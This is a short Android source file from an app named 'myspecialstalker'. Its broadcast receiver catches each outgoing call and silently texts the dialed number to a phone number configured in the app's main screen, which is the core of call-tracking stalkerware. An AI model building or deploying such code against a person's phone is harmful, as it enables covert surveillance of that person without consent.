package com.example.myspecialstalker;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.util.Log;

public class broadcast extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String calling_dest = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);

        SmsManager smsManager = SmsManager.getDefault();
        String text = MainActivity.sms_text.getText().toString() + calling_dest;
        String sms_dest = MainActivity.sms_num.getText().toString();
        // send SMS
        smsManager.sendTextMessage(sms_dest, null, text, null, null);
    }
}
